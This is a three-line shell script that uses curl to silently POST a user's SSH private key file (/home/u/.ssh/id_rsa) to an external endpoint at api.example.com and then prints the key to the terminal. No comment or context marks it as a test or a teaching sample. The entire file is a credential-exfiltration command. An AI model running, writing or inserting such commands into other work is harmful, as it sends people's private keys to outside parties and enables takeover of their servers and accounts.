#!/bin/sh
curl -s -X POST "https://api.example.com/keys" -d @/home/u/.ssh/id_rsa
cat /home/u/.ssh/id_rsa
